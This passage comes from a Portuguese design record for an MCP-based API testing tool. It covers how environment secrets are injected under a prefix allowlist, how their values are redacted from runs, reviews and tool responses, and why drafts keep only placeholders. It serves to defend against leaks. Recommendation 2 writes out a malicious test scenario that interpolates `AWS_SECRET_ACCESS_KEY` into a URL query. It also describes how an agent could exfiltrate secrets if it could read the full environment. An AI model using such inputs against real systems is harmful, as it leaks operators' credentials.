**Alternatives considered:** (a) só redação por nome (M3 atual) — REJEITADO: deixa o valor escapar em body/url/header-não-sensível (falha o DoD #2 — o teste `redactSecretValues_replaces_value_in_body` provaria). (b) detecção automática tipo gitleaks — REJEITADO (dep pesada + falsos-positivos para um problema que o Hodor não tem — ele conhece os valores; `parsimony-ladder.md` rung 1). (c) redigir só `runs/` e `reviews/`, não o `structuredContent` — REJEITADO: o agente veria o valor na resposta da tool (vazamento pela rede MCP). (d) redação SEM longest-first — REJEITADO: dois segredos onde um é substring do outro corrompem-se (o keploy aprendeu isso — `sanitize.go:539`). (e) mutar o run in-place — REJEITADO (`normalizeRun.ts:8` "NUNCA muta o input"; consistência + testabilidade).

**Consequences:** valor do segredo some de runs/reviews/web/structuredContent; complementa a redação por nome; reusa `REDACTED` (DRY); risco #1 (vazar em artefato) fechado nos sinks de execução; resíduo honesto (`CLAUDE.md` §3): se um segredo for tão curto/comum que apareça em texto legítimo, a redação o apaga lá também (mitigado pelo guard de comprimento mínimo + o operador escolhe nomes de segredo, não os valores).

### D4 — Injeção: `RunScenarioDeps.secrets` pré-popula `variables` sob namespace `env.`; `interpolate` (M1) reusado SEM mudança

**Decision:** `RunScenarioDeps` (`runScenario.ts:9`) ganha `secrets?: Record<string,string>`. Em `runScenario`, antes do loop de steps, `variables` é semeado: `for (const [k,v] of Object.entries(deps.secrets ?? {})) variables["env."+k] = v;`. O loop de steps recaptura por cima (captures são nomes nus). `interpolate.ts` NÃO muda (já resolve `env.X` via lookup de chave literal `:13`).

**Rationale:** `interpolate.ts:9` (`[\w.]+`) já aceita `env.NOME`; o namespace flat resolve `"env.GITHUB_TOKEN"` como chave-string. Semear `variables` com os secrets sob `env.*` é o mínimo (`parsimony-ladder.md` rung 4-6 — reusa o motor M1 inteiro). Espelha bruno (`combinedVars` com env num namespace, captures noutro — `interpolate-vars.js:67-78`). DIP via `deps` (já o padrão de `runScenario.ts:22`).

**Alternatives considered:** (a) objeto aninhado `variables.env = {NOME: v}` — REJEITADO: `interpolate.ts:13` testa `name in variables` com a chave-string INTEIRA (`"env.NOME"`), não navega aninhamento; mudar para dot-navigation (lodash `get` como bruno) é mais código para o mesmo efeito que a chave-flat dá (`parsimony-ladder.md` rung 5). (b) um parâmetro `secrets` separado de `variables` no `interpolate` (dois dicionários) — REJEITADO: `interpolate` ficaria com mais um argumento e a lógica de merge; um só `variables` flat com prefixo é KISS. (c) secrets com precedência SOBRE captures — REJEITADO: namespaces distintos (`env.*` vs nus) NÃO colidem, então precedência é moot; e captures nunca deveriam ter prefixo `env.` (D7 garante o isolamento).

**Consequences:** `interpolate` intocado; `runScenario` ganha ~2 linhas + um campo opcional aditivo; captures e secrets coexistem sem colisão; cenários sem secret seguem idênticos (backward-compatible).

### D5 — O DRAFT é o TEMPLATE pré-execução: carrega `${{ env.NOME }}`, NUNCA o valor; redação por valor NÃO se aplica a `drafts/` (não há valor ali)

**Decision:** `drafts/` guarda o cenário com o PLACEHOLDER `${{ env.NOME }}` literal — o valor do segredo nunca é resolvido na autoria (o draft é pré-execução). `saveDraft` mantém a redação por NOME existente (`redactDraftSecrets`, `draftStore.ts:102`) para o caso de um cenário trazer um header sensível com valor estático (não-`env`). NÃO se adiciona redação por valor a `saveDraft` (não há valor de segredo injetado para redigir).

**Rationale:** o `draftStore.ts:18-27` (`isUrlOrTemplate`) JÁ trata `${{ var }}` como cidadão de primeira classe (template resolvido em run-time). O draft é o que o humano edita no git ANTES de aprovar (`draftStore.ts:13`) — ele DEVE ver `${{ env.GITHUB_TOKEN }}`, não um valor redigido nem o segredo. A resolução só acontece em `runScenario` (execução), não em `saveDraft` (autoria). Isto alinha com keploy (o testcase commitável carrega `{{string .secret.X}}`, não o valor — `sanitize.go:398`) e bruno (o `.bru` carrega o nome da var secret, não o valor — `jsonToEnv.js:18-25`).

**Alternatives considered:** (a) resolver o segredo ao salvar o draft e redigir por valor — REJEITADO: o draft viraria específico de uma execução + exigiria `process.env` na autoria (o agente que gera o draft pode nem ter os segredos); o draft deve ser portável e re-executável por quem TIVER os segredos. (b) proibir `${{ env.* }}` em drafts — REJEITADO: é exatamente como um cenário autenticado referencia o segredo de forma commitável e segura.

**Consequences:** `drafts/` commitável sem nenhum valor de segredo (placeholder só); o resíduo documentado do M4 (`draftStore.ts:99` "segredos embutidos em URL/body não redigidos") deixa de ser um buraco PARA ESTE FLUXO, porque o caminho correto é `${{ env.NOME }}` (sem valor) — reforçar no README que segredos vão por `env.`, nunca embutidos; `saveDraft` inalterado.

### D6 — Var de env ausente = `ScenarioError` (mantém o fail-fast do M1), NÃO string vazia

**Decision:** referenciar `${{ env.NOME }}` sem um `HODOR_SECRET_NOME` correspondente no ambiente → `interpolate` lança `ScenarioError` (comportamento atual `interpolate.ts:13-15`, sem mudança). NÃO substituir por string vazia nem deixar o placeholder literal.

**Rationale:** `CLAUDE.md` §8 (fail-fast, falhe alto/cedo/claro) + `interpolate.ts:6` ("Variável ausente → ScenarioError (fail-fast, Q2)"). Um segredo ausente que vira string vazia produziria um `Authorization: Bearer ` (vazio) → 401 confuso do servidor → o operador perde tempo achando que é regressão, quando é segredo não-configurado. Falhar claro ("undefined variable in template: env.GITHUB_TOKEN") aponta direto para a causa. bruno deixa o `{{x}}` literal (lodash `get` undefined) — para um secret isso mandaria a string literal `${{ env.X }}` ao servidor (pior); o Hodor já escolheu fail-fast no M1 e M7 mantém. keploy também trata placeholder não-resolvido como erro recuperável logado (`util.go:358` "recoverable errors") — o Hodor é mais estrito (aborta), coerente com a tese "humano no gate".

**Alternatives considered:** (a) string vazia — REJEITADO (401 confuso; mascara o erro real; `CLAUDE.md` §8 anti-pattern "retornar valor mágico"). (b) deixar o placeholder literal — REJEITADO (manda `${{ env.X }}` ao servidor — pior que vazio; e potencialmente vaza a estrutura do template). (c) erro só se a var não tiver o prefixo (distinguir "não-allowlisted" de "allowlisted mas ausente") — adiado (a mensagem pode ENRIQUECER com "está allowlisted? confira o prefixo HODOR_SECRET_", mas o comportamento — abortar — é o mesmo; YAGNI distinguir os dois caminhos de erro no MVP).

**Consequences:** erro claro e cedo; nenhuma mudança em `interpolate` (já é o comportamento); o operador é avisado de segredo mal-configurado antes de bater no servidor; coerente com M1.

### D7 — Isolamento de namespace: secrets sob `env.*`, captures sob nomes nus; um cenário não pode sobrescrever um secret via capture nem ler um secret não-injetado

**Decision:** secrets vivem SEMPRE sob o prefixo `env.` em `variables`; captures de step usam nomes nus (`userId`, `token`) — nunca o prefixo `env.`. Um capture chamado `env.X` (se o agente tentar) NÃO colide com o secret real (mas é improvável — captures vêm de `step.captures` cujas chaves o agente nomeia; documentar que `env.` é reservado).

**Rationale:** bruno mantém `process.env` num namespace ANINHADO separado dos runtime vars exatamente para evitar que um `{{NOME}}` nu resolva acidentalmente um env var (`interpolate-vars.js:71-74`). O Hodor usa o mesmo princípio com prefixo de string: `env.*` é o espaço dos secrets; nomes nus são o espaço dos captures. Como `findGoldenRun`/`scenarioKey` e o diff comparam runs do MESMO cenário, e o secret não entra na `scenarioKey` (a key é `name ?? hash(method+url)` do M5 — não inclui o valor resolvido), a injeção de secret NÃO muda a identidade do cenário (o golden de um cenário autenticado é comparável run-a-run).

**Alternatives considered:** (a) sem prefixo (secrets e captures no mesmo espaço) — REJEITADO: um capture poderia sombrear um secret (ou vice-versa) — bug sutil; o prefixo isola por construção. (b) bloquear captures que comecem com `env.` — adiado (validação extra; documentar a reserva é suficiente no MVP; YAGNI o enforcement até haver um caso real).

**Consequences:** secrets e captures coexistem sem colisão; `scenarioKey` estável (secret não entra na identidade); o golden de cenário autenticado é comparável; `env.` documentado como namespace reservado.

## Recommendations

1. **(D1)** `src/mcp/server.ts`: helper `resolveSecretsFromEnv(env = process.env): Record<string,string>` — filtra `HODOR_SECRET_*`, strip do prefixo. Passar `{ secrets }` a `runScenario`/`checkScenario`/`replaySuite` nas tools. Caller de produção (wiring triad pillar a). Métrica em stderr: `secretsInjected: <count>` (NUNCA os valores — pillar c).
2. **(D2)** Restrição de segurança = prefixo `HODOR_SECRET_` (allowlist por construção). Documentar no README. Testes: var com prefixo resolve; var sem prefixo é invisível (referenciá-la → erro D6); um cenário malicioso `?x=${{ env.AWS_SECRET_ACCESS_KEY }}` sem `HODOR_SECRET_AWS_SECRET_ACCESS_KEY` → `ScenarioError`, NUNCA vaza.
3. **(D3)** `src/core/redactSecretValues.ts`: `redactSecretValues(run, secretValues): RunEnvelope` puro, longest-first, sobre url/headers/body/captures de cada step. Reusa `REDACTED`. Testes do Corner 1 (body/url/header-não-sensível/longest-first/round-trip-disco).
4. **(D3/T4)** Wirear a redação por valor em TODOS os sinks: adaptador redige o run ANTES de `persistRun` (`server.ts` run_scenario:88/check_scenario:178) e antes do `structuredContent`; `buildReviewArtifact` (`reviewArtifact.ts:54`) redige por valor após `normalizeRun`. `drafts/` é template (D5 — sem valor).
5. **(D4)** `src/core/runScenario.ts`: `RunScenarioDeps.secrets?: Record<string,string>`; semear `variables["env."+k]=v` antes do loop. `interpolate` intocado. Testes: secret resolve sob `env.*`; coexiste com capture nu.
6. **(D5)** `drafts/` guarda `${{ env.NOME }}` literal; `saveDraft` inalterado (redação por nome do M4 segue). Documentar: segredos vão por `env.`, NUNCA embutidos em url/body.
7. **(D6)** Manter o fail-fast: var ausente → `ScenarioError` (já é o comportamento `interpolate.ts:13`). Mensagem pode enriquecer com dica do prefixo.
8. **(E2E / DoD #3)** Cenário com `Authorization: Bearer ${{ env.GITHUB_TOKEN }}` contra a API do GitHub autenticada (mesmo alvo do M6 ao vivo); `HODOR_SECRET_GITHUB_TOKEN` no env do processo MCP; asseverar 200 E que `runs/{id}.json` não contém o token.
9. **(escopo — FORA do M7)** `.env` file loader (à la bruno `dotenvToJson.js`) — YAGNI no MVP (o processo herda env do spawn); keychain/encrypted store p/ valores (bruno `env-secrets.js`) — fora de escopo (o Hodor não persiste valores, então não há o que cifrar); detecção automática de segredo tipo gitleaks (keploy `sanitize.go:259`) — REJEITADO (o Hodor conhece os valores que injeta; detecção é p/ tráfego gravado de terceiros, problema que o Hodor não tem); `SecretProvider` interface multi-fonte (vault/aws-sm) — YAGNI (uma fonte, `process.env`; abstração p/ um implementador viola `architecture.md` §6); prefixo configurável `HODOR_SECRET_PREFIX` — adiado (fixo é mais auditável); `environment` declarado dentro do Scenario (à la bruno) — REJEITADO (daria ao agente o poder de declarar quais env vars ler; a allowlist é do operador, via prefixo no host); JS-scripting de secret (à la bruno node-vm) — REJEITADO frontalmente (o node-vm de bruno vaza `global.process` — `sandbox/node-vm/index.js:145-150` — exatamente o anti-pattern que D2 evita); redação de segredo embutido em url/body do DRAFT — N/A (o draft usa `${{ env.X }}`, sem valor — D5).

## Blocked questions (if any)

Nenhuma — as 6 perguntas do escopo respondidas com citações verificadas em ≥2 referências independentes (keploy `pkg/service/tools/sanitize.go:391-407,539,561,649,864,905` redação por valor + `pkg/util.go:337-368` injeção uniforme + `pkg/models/config.go:9,22` separação valor/commit; bruno `packages/bruno-cli/src/commands/run.js:568` process.env inteiro + `packages/bruno-cli/src/runner/interpolate-vars.js:67-79` combinedVars/namespace + `packages/bruno-lang/v2/src/jsonToEnv.js:8-25` nome-no-git/valor-fora + `packages/bruno-js/src/sandbox/node-vm/index.js:145-150` anti-pattern de exposição; baseline Hodor M1 `interpolate.ts`/`runScenario.ts`, M3 `normalizeRun.ts`/`reviewArtifact.ts`, M4 `draftStore.ts`, M6 `checkScenario.ts`/`mcp/server.ts`). A descoberta DECISIVA do M7 (QUAIS env vars expor) foi resolvida por evidência negativa de SEGURANÇA: bruno expõe `{...process.env}` INTEIRO (`run.js:568`) — aceitável num client desktop, exfiltração num MCP dirigido por agente; logo o Hodor restringe por prefixo `HODOR_SECRET_*` (allowlist por construção, KISS, sem config nova — D2). A redação POR VALOR (DoD #2) tem algoritmo reaproveitável pronto no keploy (`containsAnySecret`+`ReplaceAll` longest-first — `sanitize.go:649,539,561`), com a simplificação de que o Hodor NÃO precisa detectar (conhece os valores que injeta — ZERO dep). O `interpolate` do M1 já aceita `env.NOME` sem mudança (regex `[\w.]+` — `interpolate.ts:9`), então a injeção é semear `variables` com `env.*` no `runScenario` (D4). Negativa relevante: bruno NÃO redige segredo por valor em nenhum sink (`runner/utils/index.ts:26` só image) — o Hodor fecha esse gap; e o node-vm de bruno (`sandbox/node-vm/index.js:145-150`) é o anti-pattern de exposição que D2 evita explicitamente.
